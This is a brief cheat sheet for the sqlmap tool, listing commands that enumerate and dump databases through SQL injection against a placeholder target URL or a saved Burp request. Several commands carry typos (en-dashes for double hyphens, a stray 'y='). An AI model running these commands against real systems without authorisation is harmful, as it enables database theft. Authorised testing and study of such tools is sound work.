# sqlmap

1. Automated sql injection and database takeover tool.
2. Usage:
   1. python sqlmap.py -u "http://www.target.com/vuln.php?id=1" \[--dbs --tables --columns] (To Enumerate database or Tables or Columns)
   2. python sqlmap.py -u "http://www.target.com/vuln.php?id=1" \[-D dbname -T y=tblname -C colname] --dump (When you know DB name, table name or column name and dump the data)
   3. python sqlmap -u "http://www.target.com/vuln.php?id=1" –method "POST" –data "postformdata" -D dbname -T tblname –dump
   4. python sqlmap.py -r request.txt \[--dbs --tables --columns] (If you hav e saved request from burp)
